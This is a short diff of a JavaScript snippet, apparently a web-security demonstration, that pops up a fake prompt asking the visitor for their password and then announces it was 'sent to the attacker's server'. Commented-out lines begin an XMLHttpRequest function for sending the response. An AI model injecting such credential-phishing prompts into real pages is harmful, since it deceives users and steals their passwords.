@@ -1,5 +1,5 @@
 var pass=prompt('Para continuar inserta tu contraseña');
-alert('contraseña: ' + pass+ ', enviada al server del atacante ;) - omespino websec');
+alert('contraseña: ' + pass+ ', enviada al server del atacante @ omespino websec');
 
 // function send_response(response){
 // 	var oReqX = new XMLHttpRequest();
